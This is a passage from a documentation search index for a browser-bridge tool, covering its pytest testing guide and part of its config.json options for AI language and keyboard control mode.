Tests","text":"<pre><code># Single test file\npytest tests/unit/test_models.py\n\n# Single test class\npytest tests/unit/test_models.py::TestExecuteRequest\n\n# Single test function\npytest tests/unit/test_models.py::TestExecuteRequest::test_valid_execute_request\n\n# Tests matching pattern\npytest -k \"test_execute\"\n</code></pre>"},{"location":"development/testing/#with-coverage","title":"With Coverage","text":"<pre><code># Run with coverage\npytest --cov=zen\n\n# With HTML report\npytest --cov=zen --cov-report=html\nopen htmlcov/index.html\n\n# With terminal report showing missing lines\npytest --cov=zen --cov-report=term-missing\n\n# Coverage for specific module\npytest tests/unit/test_models.py --cov=zen.domain.models\n</code></pre>"},{"location":"development/testing/#watch-mode","title":"Watch Mode","text":"<pre><code># Install pytest-watch\npip install pytest-watch\n\n# Run tests on file changes\nptw\n</code></pre>"},{"location":"development/testing/#writing-tests","title":"Writing Tests","text":""},{"location":"development/testing/#unit-tests","title":"Unit Tests","text":"<p>Unit tests should be fast, isolated, and test single functions.</p>"},{"location":"development/testing/#basic-example","title":"Basic Example","text":"<pre><code># tests/unit/test_my_service.py\nimport pytest\nfrom zen.services.my_service import MyService\n\n\nclass TestMyService:\n    \"\"\"Test MyService functionality.\"\"\"\n\n    def test_initialization(self):\n        \"\"\"Test service can be initialized.\"\"\"\n        service = MyService()\n        assert service is not None\n\n    def test_process_data(self):\n        \"\"\"Test data processing.\"\"\"\n        service = MyService()\n        result = service.process(\"input\")\n        assert result == \"processed: input\"\n\n    def test_invalid_input_raises_error(self):\n        \"\"\"Test that invalid input raises ValueError.\"\"\"\n        service = MyService()\n        with pytest.raises(ValueError) as exc_info:\n            service.process(\"\")\n\n        assert \"input is required\" in str(exc_info.value)\n</code></pre>"},{"location":"development/testing/#pydantic-model-tests","title":"Pydantic Model Tests","text":"<pre><code># tests/unit/test_models.py\nimport pytest\nfrom pydantic import ValidationError\nfrom zen.domain.models import ExecuteRequest\n\n\nclass TestExecuteRequest:\n    \"\"\"Test ExecuteRequest model.\"\"\"\n\n    def test_valid_request(self):\n        \"\"\"Test creating valid request.\"\"\"\n        req = ExecuteRequest(\n            request_id=\"test-123\",\n            code=\"document.title\"\n        )\n        assert req.type == \"execute\"\n        assert req.request_id == \"test-123\"\n        assert req.code == \"document.title\"\n\n    def test_missing_required_field(self):\n        \"\"\"Test that missing required field raises error.\"\"\"\n        with pytest.raises(ValidationError) as exc_info:\n            ExecuteRequest(request_id=\"test-123\")  # Missing code\n\n        errors = exc_info.value.errors()\n        assert any(e[\"loc\"] == (\"code\",) for e in errors)\n\n    def test_serialization(self):\n        \"\"\"Test model serialization.\"\"\"\n        req = ExecuteRequest(request_id=\"id\", code=\"code\")\n        data = req.model_dump()\n\n        assert data == {\n            \"type\": \"execute\",\n            \"request_id\": \"id\",\n            \"code\": \"code\"\n        }\n\n    def test_deserialization(self):\n        \"\"\"Test model deserialization.\"\"\"\n        data = {\n            \"type\": \"execute\",\n            \"request_id\": \"id\",\n            \"code\": \"code\"\n        }\n        req = ExecuteRequest(**data)\n\n        assert req.request_id == \"id\"\n        assert req.code == \"code\"\n</code></pre>"},{"location":"development/testing/#async-tests","title":"Async Tests","text":"<p>For async functions, use <code>@pytest.mark.asyncio</code>:</p> <pre><code>import pytest\nfrom pathlib import Path\nfrom zen.adapters import filesystem\n\n\n@pytest.mark.asyncio\nasync def test_read_text_async():\n    \"\"\"Test async file reading.\"\"\"\n    test_file = Path(\"test.txt\")\n\n    # Create test file\n    test_file.write_text(\"test content\")\n\n    try:\n        # Test async read\n        content = await filesystem.read_text_async(test_file)\n        assert content == \"test content\"\n    finally:\n        # Cleanup\n        test_file.unlink()\n\n\n@pytest.mark.asyncio\nasync def test_script_loader_async():\n    \"\"\"Test async script loading.\"\"\"\n    from zen.services.script_loader import ScriptLoader\n\n    loader = ScriptLoader()\n    script = await loader.load_script_async(\"control.js\")\n\n    assert len(script) &gt; 0\n    assert \"use strict\" in script\n</code></pre>"},{"location":"development/testing/#fixtures","title":"Fixtures","text":"<p>Fixtures provide reusable test data and setup.</p>"},{"location":"development/testing/#basic-fixtures","title":"Basic Fixtures","text":"<pre><code># tests/conftest.py\nimport pytest\nfrom pathlib import Path\n\n\n@pytest.fixture\ndef project_root():\n    \"\"\"Return project root directory.\"\"\"\n    return Path(__file__).parent.parent\n\n\n@pytest.fixture\ndef scripts_dir(project_root):\n    \"\"\"Return scripts directory.\"\"\"\n    return project_root / \"zen\" / \"scripts\"\n\n\n@pytest.fixture\ndef sample_config():\n    \"\"\"Return sample configuration.\"\"\"\n    return {\n        \"ai-language\": \"en\",\n        \"control\": {\n            \"auto-refocus\": \"only-spa\",\n            \"verbose\": True\n        }\n    }\n</code></pre>"},{"location":"development/testing/#using-fixtures","title":"Using Fixtures","text":"<pre><code>def test_scripts_directory_exists(scripts_dir):\n    \"\"\"Test that scripts directory exists.\"\"\"\n    assert scripts_dir.exists()\n    assert scripts_dir.is_dir()\n\n\ndef test_load_config_with_sample(sample_config):\n    \"\"\"Test loading sample config.\"\"\"\n    from zen.config import validate_control_config\n\n    validated = validate_control_config(sample_config)\n    assert validated[\"auto-refocus\"] == \"only-spa\"\n</code></pre>"},{"location":"development/testing/#async-fixtures","title":"Async Fixtures","text":"<pre><code>import pytest\nfrom zen.bridge_ws import create_app\nfrom aiohttp.test_utils import TestServer\n\n\n@pytest.fixture\nasync def server():\n    \"\"\"Start test server.\"\"\"\n    app = create_app()\n    server = TestServer(app)\n    await server.start_server()\n\n    yield server\n\n    await server.close()\n\n\n@pytest.mark.asyncio\nasync def test_health_endpoint(server):\n    \"\"\"Test health endpoint.\"\"\"\n    async with server.client.request(\"GET\", \"/health\") as resp:\n        assert resp.status == 200\n        data = await resp.json()\n        assert data[\"ok\"] is True\n</code></pre>"},{"location":"development/testing/#mocking","title":"Mocking","text":"<p>Mocking replaces real implementations with test doubles.</p>"},{"location":"development/testing/#mock-functions","title":"Mock Functions","text":"<pre><code>import pytest\nfrom unittest.mock import Mock, patch\n\n\ndef test_execute_with_mocked_client():\n    \"\"\"Test execution with mocked client.\"\"\"\n    from zen.services.bridge_executor import BridgeExecutor\n\n    # Create mock client\n    mock_client = Mock()\n    mock_client.execute.return_value = {\n        \"ok\": True,\n        \"result\": \"Test Result\"\n    }\n\n    # Create executor with mock\n    executor = BridgeExecutor()\n    executor.client = mock_client\n\n    # Test\n    result = executor.execute(\"test code\")\n\n    assert result[\"ok\"] is True\n    assert result[\"result\"] == \"Test Result\"\n    mock_client.execute.assert_called_once_with(\"test code\", timeout=10.0)\n</code></pre>"},{"location":"development/testing/#patch-functions","title":"Patch Functions","text":"<pre><code>@patch(\"zen.adapters.filesystem.read_text_sync\")\ndef test_script_loader_with_mock_fs(mock_read):\n    \"\"\"Test script loader with mocked filesystem.\"\"\"\n    from zen.services.script_loader import ScriptLoader\n\n    # Configure mock\n    mock_read.return_value = \"console.log('test');\"\n\n    # Test\n    loader = ScriptLoader()\n    script = loader.load_script_sync(\"test.js\")\n\n    assert script == \"console.log('test');\"\n    mock_read.assert_called_once()\n</code></pre>"},{"location":"development/testing/#monkeypatch-pytest-specific","title":"Monkeypatch (Pytest-specific)","text":"<pre><code>def test_with_monkeypatch(monkeypatch):\n    \"\"\"Test using monkeypatch.\"\"\"\n    from zen.services import my_service\n\n    # Patch function\n    def mock_function():\n        return \"mocked\"\n\n    monkeypatch.setattr(my_service, \"real_function\", mock_function)\n\n    # Test\n    result = my_service.real_function()\n    assert result == \"mocked\"\n</code></pre>"},{"location":"development/testing/#integration-tests","title":"Integration Tests","text":"<p>Integration tests test multiple components together.</p>"},{"location":"development/testing/#server-client-test","title":"Server + Client Test","text":"<pre><code># tests/integration/test_bridge_loop.py\nimport pytest\nimport aiohttp\nfrom aiohttp import web\nfrom zen.bridge_ws import create_app\n\n\n@pytest.mark.integration\n@pytest.mark.asyncio\nasync def test_execute_request_response():\n    \"\"\"Test full request/response cycle.\"\"\"\n    # Start server\n    app = create_app()\n    runner = web.AppRunner(app)\n    await runner.setup()\n    site = web.TCPSite(runner, \"127.0.0.1\", 8765)\n    await site.start()\n\n    try:\n        async with aiohttp.ClientSession() as session:\n            # Mock browser WebSocket\n            async with session.ws_connect(\"ws://127.0.0.1:8766/ws\") as ws:\n                # CLI sends request\n                async with session.post(\n                    \"http://127.0.0.1:8765/run\",\n                    json={\"code\": \"document.title\"}\n                ) as resp:\n                    data = await resp.json()\n                    request_id = data[\"request_id\"]\n\n                # Browser receives message\n                msg = await ws.receive_json()\n                assert msg[\"type\"] == \"execute\"\n                assert msg[\"request_id\"] == request_id\n\n                # Browser sends result\n                await ws.send_json({\n                    \"type\": \"result\",\n                    \"request_id\": request_id,\n                    \"ok\": True,\n                    \"result\": \"Test Page\"\n                })\n\n                # CLI polls for result\n                async with session.get(\n                    f\"http://127.0.0.1:8765/result?request_id={request_id}\"\n                ) as resp:\n                    result = await resp.json()\n                    assert result[\"ok\"] is True\n                    assert result[\"result\"] == \"Test Page\"\n    finally:\n        await runner.cleanup()\n</code></pre>"},{"location":"development/testing/#e2e-tests-playwright","title":"E2E Tests (Playwright)","text":"<p>End-to-end tests use a real browser.</p> <pre><code># tests/e2e/test_browser_integration.py\nimport pytest\nimport subprocess\nfrom playwright.sync_api import sync_playwright\n\n\n@pytest.fixture\ndef zen_server():\n    \"\"\"Start zen server in background.\"\"\"\n    proc = subprocess.Popen([\"zen\", \"server\", \"start\"])\n    yield\n    proc.terminate()\n\n\n@pytest.mark.e2e\ndef test_eval_command(zen_server):\n    \"\"\"Test zen eval command with real browser.\"\"\"\n    with sync_playwright() as p:\n        # Launch browser\n        browser = p.chromium.launch()\n        page = browser.new_page()\n\n        # Install userscript (simplified)\n        # In real test, inject userscript via extension\n\n        # Navigate to test page\n        page.goto(\"https://example.com\")\n\n        # Wait for WebSocket connection\n        page.wait_for_timeout(1000)\n\n        # Run CLI command\n        result = subprocess.run(\n            [\"zen\", \"eval\", \"document.title\"],\n            capture_output=True,\n            text=True\n        )\n\n        # Verify\n        assert result.returncode == 0\n        assert \"Example Domain\" in result.stdout\n\n        browser.close()\n</code></pre>"},{"location":"development/testing/#test-coverage","title":"Test Coverage","text":""},{"location":"development/testing/#current-coverage","title":"Current Coverage","text":"<p>Phase 0-2 Status:</p> <ul> <li>Overall: 11.83%</li> <li>Domain models: 94.70%</li> <li>Tests: 52 passing (24 smoke + 28 models)</li> </ul>"},{"location":"development/testing/#target-coverage","title":"Target Coverage","text":"<p>Phase 3 Goals:</p> <ul> <li>Overall: \u226580%</li> <li>Services: \u226585%</li> <li>Adapters: \u226590%</li> <li>Domain: \u226595%</li> <li>CLI: \u226570%</li> </ul>"},{"location":"development/testing/#checking-coverage","title":"Checking Coverage","text":"<pre><code># Generate coverage report\npytest --cov=zen --cov-report=term-missing\n\n# HTML report\npytest --cov=zen --cov-report=html\nopen htmlcov/index.html\n\n# Coverage for specific package\npytest --cov=zen.services --cov-report=term\n\n# Fail if coverage below threshold\npytest --cov=zen --cov-fail-under=80\n</code></pre>"},{"location":"development/testing/#coverage-configuration","title":"Coverage Configuration","text":"<p>Create <code>.coveragerc</code>:</p> <pre><code>[run]\nsource = zen\nomit =\n    */tests/*\n    */venv/*\n    */__pycache__/*\n\n[report]\nexclude_lines =\n    pragma: no cover\n    def __repr__\n    raise NotImplementedError\n    if __name__ == .__main__.:\n    if TYPE_CHECKING:\n    @abstractmethod\n</code></pre>"},{"location":"development/testing/#test-organization","title":"Test Organization","text":""},{"location":"development/testing/#test-classes","title":"Test Classes","text":"<p>Group related tests in classes:</p> <pre><code>class TestScriptLoader:\n    \"\"\"Test ScriptLoader service.\"\"\"\n\n    def test_load_script_sync(self):\n        \"\"\"Test synchronous script loading.\"\"\"\n        ...\n\n    def test_load_script_async(self):\n        \"\"\"Test asynchronous script loading.\"\"\"\n        ...\n\n    def test_caching(self):\n        \"\"\"Test script caching.\"\"\"\n        ...\n\n    def test_substitution(self):\n        \"\"\"Test template substitution.\"\"\"\n        ...\n</code></pre>"},{"location":"development/testing/#test-markers","title":"Test Markers","text":"<p>Use markers to categorize tests:</p> <pre><code>@pytest.mark.unit\ndef test_something():\n    \"\"\"Unit test.\"\"\"\n    ...\n\n\n@pytest.mark.integration\ndef test_integration():\n    \"\"\"Integration test.\"\"\"\n    ...\n\n\n@pytest.mark.e2e\ndef test_browser():\n    \"\"\"E2E test.\"\"\"\n    ...\n\n\n@pytest.mark.slow\ndef test_slow_operation():\n    \"\"\"Slow test.\"\"\"\n    ...\n</code></pre> <p>Run specific markers:</p> <pre><code># Only unit tests\npytest -m unit\n\n# Only integration tests\npytest -m integration\n\n# Skip slow tests\npytest -m \"not slow\"\n</code></pre>"},{"location":"development/testing/#parametrized-tests","title":"Parametrized Tests","text":"<p>Test multiple inputs:</p> <pre><code>@pytest.mark.parametrize(\"input,expected\", [\n    (\"hello\", \"HELLO\"),\n    (\"world\", \"WORLD\"),\n    (\"\", \"\"),\n    (\"123\", \"123\"),\n])\ndef test_uppercase(input, expected):\n    \"\"\"Test uppercase conversion.\"\"\"\n    assert input.upper() == expected\n\n\n@pytest.mark.parametrize(\"code,result_type\", [\n    (\"1 + 1\", int),\n    (\"'hello'\", str),\n    (\"[1, 2, 3]\", list),\n    (\"{'a': 1}\", dict),\n])\ndef test_eval_types(code, result_type):\n    \"\"\"Test eval returns correct types.\"\"\"\n    from zen.services.bridge_executor import get_executor\n\n    executor = get_executor()\n    result = executor.execute(code)\n\n    assert isinstance(result[\"result\"], result_type)\n</code></pre>"},{"location":"development/testing/#best-practices","title":"Best Practices","text":""},{"location":"development/testing/#test-naming","title":"Test Naming","text":"<p>Use descriptive names:</p> <pre><code># \u2705 Good\ndef test_execute_returns_error_when_server_not_running():\n    \"\"\"Test that execute raises error when server is not running.\"\"\"\n    ...\n\n# \u274c Bad\ndef test_execute():\n    \"\"\"Test execute.\"\"\"\n    ...\n</code></pre>"},{"location":"development/testing/#aaa-pattern","title":"AAA Pattern","text":"<p>Arrange, Act, Assert:</p> <pre><code>def test_script_loader_caching():\n    \"\"\"Test that scripts are cached after first load.\"\"\"\n    # Arrange\n    from zen.services.script_loader import ScriptLoader\n    loader = ScriptLoader()\n\n    # Act\n    script1 = loader.load_script_sync(\"control.js\")\n    script2 = loader.load_script_sync(\"control.js\")\n\n    # Assert\n    assert script1 == script2\n    assert \"control.js\" in loader.get_cached_scripts()\n</code></pre>"},{"location":"development/testing/#one-assertion-per-test","title":"One Assertion Per Test","text":"<pre><code># \u2705 Good - Each test has clear purpose\ndef test_execute_request_has_type():\n    \"\"\"Test ExecuteRequest has type field.\"\"\"\n    req = ExecuteRequest(request_id=\"id\", code=\"code\")\n    assert req.type == \"execute\"\n\n\ndef test_execute_request_has_request_id():\n    \"\"\"Test ExecuteRequest has request_id field.\"\"\"\n    req = ExecuteRequest(request_id=\"id\", code=\"code\")\n    assert req.request_id == \"id\"\n\n\n# \u274c Bad - Multiple unrelated assertions\ndef test_execute_request():\n    \"\"\"Test ExecuteRequest.\"\"\"\n    req = ExecuteRequest(request_id=\"id\", code=\"code\")\n    assert req.type == \"execute\"\n    assert req.request_id == \"id\"\n    assert req.code == \"code\"\n</code></pre>"},{"location":"development/testing/#test-independence","title":"Test Independence","text":"<p>Each test should be independent:</p> <pre><code># \u2705 Good - Independent tests\ndef test_load_script():\n    \"\"\"Test loading script.\"\"\"\n    loader = ScriptLoader()  # New instance\n    script = loader.load_script_sync(\"test.js\")\n    assert script is not None\n\n\ndef test_cache_script():\n    \"\"\"Test caching script.\"\"\"\n    loader = ScriptLoader()  # New instance\n    loader.load_script_sync(\"test.js\")\n    assert \"test.js\" in loader.get_cached_scripts()\n\n\n# \u274c Bad - Tests depend on each other\nloader = ScriptLoader()  # Shared state\n\ndef test_load_script():\n    \"\"\"Test loading script.\"\"\"\n    loader.load_script_sync(\"test.js\")\n\ndef test_cache_script():\n    \"\"\"Test caching script.\"\"\"\n    # Depends on test_load_script running first\n    assert \"test.js\" in loader.get_cached_scripts()\n</code></pre>"},{"location":"development/testing/#continuous-integration","title":"Continuous Integration","text":""},{"location":"development/testing/#github-actions","title":"GitHub Actions","text":"<pre><code># .github/workflows/test.yml\nname: Tests\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"3.11\", \"3.12\", \"3.13\"]\n\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install dependencies\n        run: |\n          pip install -e \".[dev]\"\n\n      - name: Run tests\n        run: |\n          pytest --cov=zen --cov-report=xml\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n</code></pre>"},{"location":"development/testing/#debugging-tests","title":"Debugging Tests","text":""},{"location":"development/testing/#print-debugging","title":"Print Debugging","text":"<pre><code>def test_with_debug():\n    \"\"\"Test with debug output.\"\"\"\n    result = some_function()\n\n    # Print for debugging\n    print(f\"Result: {result}\")\n    print(f\"Type: {type(result)}\")\n\n    assert result is not None\n</code></pre> <p>Run with <code>-s</code> to see prints:</p> <pre><code>pytest tests/test_file.py -s\n</code></pre>"},{"location":"development/testing/#pdb-debugging","title":"PDB Debugging","text":"<pre><code>def test_with_pdb():\n    \"\"\"Test with debugger.\"\"\"\n    result = some_function()\n\n    # Drop into debugger\n    import pdb; pdb.set_trace()\n\n    assert result is not None\n</code></pre> <p>Run to trigger debugger:</p> <pre><code>pytest tests/test_file.py\n</code></pre>"},{"location":"development/testing/#pytest-debugging","title":"Pytest Debugging","text":"<pre><code># Drop into debugger on failure\npytest --pdb\n\n# Drop into debugger at start\npytest --trace\n</code></pre>"},{"location":"development/testing/#resources","title":"Resources","text":"<ul> <li>pytest documentation</li> <li>pytest-asyncio</li> <li>pytest-cov</li> <li>Playwright for Python</li> </ul>"},{"location":"development/testing/#next-steps","title":"Next Steps","text":"<ul> <li>Architecture Guide - System design</li> <li>Contributing Guide - Development workflow</li> <li>Security Guide - Security model</li> </ul>"},{"location":"getting-started/configuration/","title":"Configuration","text":"<p>Customize Zen Browser Bridge for your specific workflow with comprehensive configuration options. This guide covers everything from basic settings to advanced control mode customization.</p>"},{"location":"getting-started/configuration/#configuration-file-location","title":"Configuration File Location","text":"<p>Zen Bridge uses a JSON configuration file:</p> <pre><code>config.json\n</code></pre> <p>The file is located in the project root directory where you installed Zen Bridge.</p> <p>Create Config File</p> <p>If <code>config.json</code> doesn't exist, create it in the project root: <pre><code>cd /path/to/zen-bridge\ntouch config.json\n</code></pre></p>"},{"location":"getting-started/configuration/#configuration-structure","title":"Configuration Structure","text":"<p>The configuration file has two main sections:</p> <ol> <li><code>ai-language</code> - Language for AI operations (summarize, describe)</li> <li><code>control</code> - Keyboard control mode settings</li> </ol>"},{"location":"getting-started/configuration/#complete-default-configuration","title":"Complete Default Configuration","text":"<pre><code>{\n  \"ai-language\": \"auto\",\n  \"control\": {\n    \"auto-refocus\": \"only-spa\",\n    \"focus-outline\": \"custom\",\n    \"speak-name\": false,\n    \"speak-all\": true,\n    \"announce-role\": false,\n    \"announce-on-page-load\": false,\n    \"navigation-wrap\": true,\n    \"scroll-on-focus\": true,\n    \"click-delay\": 0,\n    \"focus-color\": \"#0066ff\",\n    \"focus-size\": 3,\n    \"focus-animation\": true,\n    \"focus-glow\": true,\n    \"sound-on-focus\": \"none\",\n    \"selector-strategy\": \"id-first\",\n    \"refocus-timeout\": 2000,\n    \"verbose\": true,\n    \"verbose-logging\": false\n  }\n}\n</code></pre>"},{"location":"getting-started/configuration/#ai-language-configuration","title":"AI Language Configuration","text":""},{"location":"getting-started/configuration/#ai-language","title":"<code>ai-language</code>","text":"<p>Controls the language used for AI-powered features (<code>zen summarize</code> and <code>zen describe</code>).</p> <p>Type: <code>string</code> Default: <code>\"auto\"</code> Options: <code>\"auto\"</code>, <code>\"en\"</code>, <code>\"nl\"</code>, <code>\"fr\"</code>, <code>\"de\"</code>, <code>\"es\"</code>, etc.</p> Auto-detect (Default)Fixed LanguageMultiple Languages <pre><code>{\n  \"ai-language\": \"auto\"\n}\n</code></pre> <p>Automatically detects the page language and uses it for AI operations.</p> <pre><code>{\n  \"ai-language\": \"en\"\n}\n</code></pre> <p>Always use English for AI operations, regardless of page language.</p> <pre><code>{\n  \"ai-language\": \"nl\"\n}\n</code></pre> <p>Use Dutch for summaries and descriptions.</p> <p>Supported Languages: Any language code supported by your AI provider (mods).</p> <p>Requires mods</p> <p>AI features require mods to be installed. The language setting is passed to the AI model in the prompt.</p>"},{"location":"getting-started/configuration/#control-mode-configuration","title":"Control Mode Configuration","text":"<p>The <code>control</code> section customizes keyboard navigation behavior when using <code>zen control</code>.</p>"},{"location":"getting-started/configuration/#auto-refocus-settings","title":"Auto-Refocus Settings","text":""},{"location":"getting-started/configuration/#auto-refocus","title":"<code>auto-refocus</code>","text":"<p>When to automatically refocus the previously focused element after page navigation.</p> <p>Type: <code>\"always\"</code> | <code>\"only-spa\"</code> | <code>\"never\"</code> Default: <code>\"only-spa\"</code></p> only-spa (Default)alwaysnever <pre><code>{\n  \"control\": {\n    \"auto-refocus\": \"only-spa\"\n  }\n}\n</code></pre> <p>Only refocus on Single Page Applications (SPAs) where the URL changes without a full page reload.</p> <p>Use case: Modern web apps like Gmail, Twitter, GitHub.</p> <pre><code>{\n  \"control\": {\n    \"auto-refocus\": \"always\"\n  }\n}\n</code></pre> <p>Always try to refocus after any page change, including full page reloads.</p> <p>Use case: Aggressive refocus behavior for maximum continuity.</p> <pre><code>{\n  \"control\": {\n    \"auto-refocus\": \"never\"\n  }\n}\n</code></pre> <p>Never automatically refocus. Focus returns to <code>&lt;body&gt;</code> after navigation.</p> <p>Use case: You prefer manual navigation from the top of each page.</p>"},{"location":"getting-started/configuration/#refocus-timeout","title":"<code>refocus-timeout</code>","text":"<p>Maximum time to wait for refocus operation to complete.</p> <p>Type: <code>number</code> (milliseconds) Default: <code>2000</code> Range: <code>100</code> - <code>10000</code></p> <pre><code>{\n  \"control\": {\n    \"refocus-timeout\": 2000\n  }\n}\n</code></pre> <p>Increase for slow-loading pages, decrease for faster feedback.</p>"},{"location":"getting-started/configuration/#focus-visual-settings","title":"Focus Visual Settings","text":""},{"location":"getting-started/configuration/#focus-outline","title":"<code>focus-outline</code>","text":"<p>Visual style for focused elements.</p> <p>Type: <code>\"custom\"</code> | <code>\"original\"</code> | <code>\"none\"</code> Default: <code>\"custom\"</code></p> custom (Default)originalnone <pre><code>{\n  \"control\": {\n    \"focus-outline\": \"custom\"\n  }\n}\n</code></pre> <p>Use Zen Bridge's custom blue outline with glow effect.</p> <pre><code>{\n  \"control\": {\n    \"focus-outline\": \"original\"\n  }\n}\n</code></pre> <p>Keep the browser's default focus outline.</p> <pre><code>{\n  \"control\": {\n    \"focus-outline\": \"none\"\n  }\n}\n</code></pre> <p>No focus outline (not recommended for accessibility).</p>"},{"location":"getting-started/configuration/#focus-color","title":"<code>focus-color</code>","text":"<p>Color of the custom focus outline.</p> <p>Type: <code>string</code> (CSS color) Default: <code>\"#0066ff\"</code></p> <pre><code>{\n  \"control\": {\n    \"focus-color\": \"#ff6600\"\n  }\n}\n</code></pre> <p>Examples:</p> <ul> <li><code>\"#0066ff\"</code> - Blue (default)</li> <li><code>\"#ff0000\"</code> - Red</li> <li><code>\"rgb(255, 0, 0)\"</code> - Red (RGB)</li> <li><code>\"orange\"</code> - Orange (named color)</li> </ul>"},{"location":"getting-started/configuration/#focus-size","title":"<code>focus-size</code>","text":"<p>Width of the focus outline in pixels.</p> <p>Type: <code>number</code> (pixels) Default: <code>3</code> Range: <code>1</code> - <code>10</code></p> <pre><code>{\n  \"control\": {\n    \"focus-size\": 5\n  }\n}\n</code></pre> <p>Larger values create more prominent outlines.</p>"},{"location":"getting-started/configuration/#focus-animation","title":"<code>focus-animation</code>","text":"<p>Enable animated focus transitions.</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"focus-animation\": true\n  }\n}\n</code></pre> <p>Smooth fade-in effect when focus changes.</p>"},{"location":"getting-started/configuration/#focus-glow","title":"<code>focus-glow</code>","text":"<p>Enable glow effect around focused elements.</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"focus-glow\": true\n  }\n}\n</code></pre> <p>Adds a soft glow shadow for better visibility.</p>"},{"location":"getting-started/configuration/#navigation-behavior","title":"Navigation Behavior","text":""},{"location":"getting-started/configuration/#navigation-wrap","title":"<code>navigation-wrap</code>","text":"<p>Whether navigation wraps from last element to first (and vice versa).</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"navigation-wrap\": true\n  }\n}\n</code></pre> <p>When <code>true</code>, pressing Tab on the last focusable element jumps to the first.</p>"},{"location":"getting-started/configuration/#scroll-on-focus","title":"<code>scroll-on-focus</code>","text":"<p>Automatically scroll focused elements into view.</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"scroll-on-focus\": true\n  }\n}\n</code></pre> <p>Ensures focused elements are always visible.</p>"},{"location":"getting-started/configuration/#click-delay","title":"<code>click-delay</code>","text":"<p>Delay before executing click actions (in milliseconds).</p> <p>Type: <code>number</code> (milliseconds) Default: <code>0</code> Range: <code>0</code> - <code>5000</code></p> <pre><code>{\n  \"control\": {\n    \"click-delay\": 100\n  }\n}\n</code></pre> <p>Useful if pages need time to settle before clicks.</p>"},{"location":"getting-started/configuration/#audio-feedback","title":"Audio Feedback","text":""},{"location":"getting-started/configuration/#sound-on-focus","title":"<code>sound-on-focus</code>","text":"<p>Play a sound when focus changes.</p> <p>Type: <code>\"none\"</code> | <code>\"beep\"</code> | <code>\"click\"</code> | <code>\"subtle\"</code> Default: <code>\"none\"</code></p> none (Default)beepclicksubtle <pre><code>{\n  \"control\": {\n    \"sound-on-focus\": \"none\"\n  }\n}\n</code></pre> <p>No sound effects.</p> <pre><code>{\n  \"control\": {\n    \"sound-on-focus\": \"beep\"\n  }\n}\n</code></pre> <p>Short beep on focus change.</p> <pre><code>{\n  \"control\": {\n    \"sound-on-focus\": \"click\"\n  }\n}\n</code></pre> <p>Click sound on focus change.</p> <pre><code>{\n  \"control\": {\n    \"sound-on-focus\": \"subtle\"\n  }\n}\n</code></pre> <p>Subtle tone on focus change.</p> <p>Browser Support</p> <p>Sound effects require browser support for the Web Audio API.</p>"},{"location":"getting-started/configuration/#speech-announcements","title":"Speech Announcements","text":""},{"location":"getting-started/configuration/#speak-all","title":"<code>speak-all</code>","text":"<p>Speak all terminal output via text-to-speech (macOS only).</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"speak-all\": true\n  }\n}\n</code></pre> <p>Uses macOS <code>say</code> command to read terminal messages aloud.</p>"},{"location":"getting-started/configuration/#speak-name","title":"<code>speak-name</code>","text":"<p>Speak element name when focused.</p> <p>Type: <code>boolean</code> Default: <code>false</code></p> <pre><code>{\n  \"control\": {\n    \"speak-name\": true\n  }\n}\n</code></pre> <p>Announces accessible name of focused element (from <code>aria-label</code>, text content, etc.).</p>"},{"location":"getting-started/configuration/#announce-role","title":"<code>announce-role</code>","text":"<p>Announce element role (button, link, heading, etc.).</p> <p>Type: <code>boolean</code> Default: <code>false</code></p> <pre><code>{\n  \"control\": {\n    \"announce-role\": true\n  }\n}\n</code></pre> <p>Example: \"Submit button\" instead of just \"Submit\".</p>"},{"location":"getting-started/configuration/#announce-on-page-load","title":"<code>announce-on-page-load</code>","text":"<p>Announce page title when a new page loads.</p> <p>Type: <code>boolean</code> Default: <code>false</code></p> <pre><code>{\n  \"control\": {\n    \"announce-on-page-load\": true\n  }\n}\n</code></pre> <p>Helps orient you when navigating between pages.</p>"},{"location":"getting-started/configuration/#element-selection-strategy","title":"Element Selection Strategy","text":""},{"location":"getting-started/configuration/#selector-strategy","title":"<code>selector-strategy</code>","text":"<p>Strategy for generating element selectors for refocus operations.</p> <p>Type: <code>\"id-first\"</code> | <code>\"aria-first\"</code> | <code>\"css-first\"</code> Default: <code>\"id-first\"</code></p> id-first (Default)aria-firstcss-first <pre><code>{\n  \"control\": {\n    \"selector-strategy\": \"id-first\"\n  }\n}\n</code></pre> <p>Prefer <code>id</code> attributes, fall back to ARIA, then CSS selectors.</p> <p>Best for: Most web pages with proper IDs.</p> <pre><code>{\n  \"control\": {\n    \"selector-strategy\": \"aria-first\"\n  }\n}\n</code></pre> <p>Prefer ARIA labels, fall back to ID, then CSS.</p> <p>Best for: Accessibility-focused applications.</p> <pre><code>{\n  \"control\": {\n    \"selector-strategy\": \"css-first\"\n  }\n}\n</code></pre> <p>Use CSS selectors based on tag/class/structure.</p> <p>Best for: Pages with dynamic IDs.</p>"},{"location":"getting-started/configuration/#logging-and-debugging","title":"Logging and Debugging","text":""},{"location":"getting-started/configuration/#verbose","title":"<code>verbose</code>","text":"<p>Show detailed terminal announcements during control mode.</p> <p>Type: <code>boolean</code> Default: <code>true</code></p> <pre><code>{\n  \"control\": {\n    \"verbose\": true\n  }\n}\n</code></pre> <p>When <code>true</code>, prints messages like \"Focused: Submit button\" to the terminal.</p>"},{"location":"getting-started/configuration/#verbose-logging","title":"<code>verbose-logging</code>","text":"<p>Enable verbose logging in the browser console.</p> <p>Type: <code>boolean</code> Default: <code>false</code></p> <pre><code>{\n  \"control\": {\n    \"verbose-logging\": true\n  }\n}\n</code></pre> <p>Useful for debugging control mode behavior. Check browser DevTools console.</p>"},{"location":"getting-started/configuration/#example-configurations","title":"Example Configurations","text":""},{"location":"getting-started/configuration/#minimal-configuration","title":"Minimal Configuration","text":"<p>For users who just want AI in a different language:</p> <pre><code>{\n  \"ai-language\": 